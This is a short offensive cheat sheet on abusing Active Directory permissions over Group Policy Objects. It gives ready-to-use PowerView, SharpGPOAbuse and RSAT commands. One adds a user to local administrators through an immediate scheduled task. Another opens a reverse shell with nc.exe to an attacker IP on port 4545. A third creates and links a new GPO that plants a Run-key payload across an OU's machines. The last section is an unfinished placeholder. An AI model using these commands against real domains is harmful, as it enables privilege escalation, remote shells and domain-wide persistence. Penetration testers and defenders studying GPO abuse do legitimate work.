# DACL Attacks on a Group Policy Object (GPO)

## 1) WriteProperty on a GPO

We can create an "evil" GPO with a scheduled task for example

##### With PowerView

    New-GPOImmediateTask -Verbose -Force -TaskName 'Update' -GPODisplayName 'weakGPO' -Command cmd -CommandArguments "/c net localgroup administrators user1 /add"

##### With SharpGPOAbuse

    ./SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author Administrator --Command "cmd.exe" --Arguments "/c /tmp/nc.exe attacker_ip 4545 -e powershell" --GPOName "weakGPO"

## 2) CreateChild on Policies Cn + WriteProperty on an OU

It is possible to create a fully new GPO and link it to an existing OU

##### With RSAT module

    New-GPO -Name "New GPO" | New-GPLink -Target "OU=Workstation,DC=domain,DC=local"
    Set-GPPrefRegistryValue -Name "New GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /C \\path\to\payload" -Type ExpandString

After GPO refresh on the OU's machines, when the machines will restart the payload will be executed

## 3) Manage Group Policy Links

CHECK_LATER
